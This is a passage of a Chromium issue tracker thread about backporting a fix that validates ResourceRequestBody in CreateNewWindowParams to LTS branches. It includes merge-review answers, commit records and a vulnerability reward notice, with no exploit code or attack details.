This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-11)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7655583
2. Low - There were 3 conflicts, but they were not complicated to get fixed.
3. 146
4. Yes, according to the description, the suspected CL[1]  was merged in 2022. Thus, the issue can occur in M138 as well.

[1] https://chromium-review.git.corp.google.com/c/chromium/src/+/3587952

### an...@google.com (2026-03-16)

re:[#comment24](https://issues.chromium.org/issues/487768779#comment24) Delayed until M146 soaked in Stable.

### sp...@google.com (2026-03-31)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $26000.00 for this report.

Rationale for this decision:
High quality with bisect. User information disclosure


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### an...@google.com (2026-04-01)

Merge approved for LTS-138

### dx...@google.com (2026-04-07)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Gyuyoung Kim [qkim@google.com](mailto:qkim@google.com)  

Link:    <https://chromium-review.googlesource.com/7655583>

[M138-LTS] Validate ResourceRequestBody in CreateNewWindowParams.

---


Expand for full commit details
```
     
    (cherry picked from commit b496550e39c5c1752d504a684ebc4d88b4009ed3) 
     
    Bug: 487768779 
    Change-Id: I15b89c501cc386ec6dee7eb3dbaab4a4cb6d0068 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635726 
    Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org> 
    Commit-Queue: Charlie Reis <creis@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1594735} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7655583 
    Reviewed-by: Charlie Reis <creis@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Michael Ershov <miersh@google.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3525} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `content/browser/renderer_host/ipc_utils.cc`
- M `content/browser/renderer_host/ipc_utils.h`
- M `content/browser/renderer_host/render_frame_host_impl.cc`
- M `content/browser/renderer_host/render_frame_host_impl.h`
- M `content/browser/security_exploit_browsertest.cc`

---

Hash: [3185e6a0edda6eab7f3d4cfc9a84ce63ced04071](https://chromiumdash.appspot.com/commit/3185e6a0edda6eab7f3d4cfc9a84ce63ced04071)  

Date: Tue Apr 7 15:50:45 2026


---

### pe...@google.com (2026-05-11)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-05-11)

1. <https://chromium-review.git.corp.google.com/c/chromium/src/+/7825370/>
2. Low - There were a few conflicts.
3. 146
4. Yes, The bug was introduced in 2022.

### dx...@google.com (2026-05-18)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Gyuyoung Kim [qkim@google.com](mailto:qkim@google.com)  

Link:    <https://chromium-review.googlesource.com/7825370>

[M144-LTS] Validate ResourceRequestBody in CreateNewWindowParams.

---


Expand for full commit details
```
     
    (cherry picked from commit b496550e39c5c1752d504a684ebc4d88b4009ed3) 
     
    Bug: 487768779 
    Change-Id: I15b89c501cc386ec6dee7eb3dbaab4a4cb6d0068 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635726 
    Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org> 
    Commit-Queue: Charlie Reis <creis@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1594735} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7825370 
    Reviewed-by: Charlie Reis <creis@chromium.org> 
    Reviewed-by: Giovanni Pezzino <giovax@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4865} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `content/browser/renderer_host/ipc_utils.cc`
- M `content/browser/renderer_host/ipc_utils.h`
- M `content/browser/renderer_host/render_frame_host_impl.cc`
- M `content/browser/renderer_host/render_frame_host_impl.h`
- M `content/browser/security_exploit_browsertest.cc`

---

Hash: [eb3896190a24680c7ba17fa58c1132d386d2a943](https://chromiumdash.appspot.com/commit/eb3896190a24680c7ba17fa58c1132d386d2a943)  

Date: Mon May 18 05:35:35 2026


---

### ch...@google.com (2026-06-12)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/487768779)*
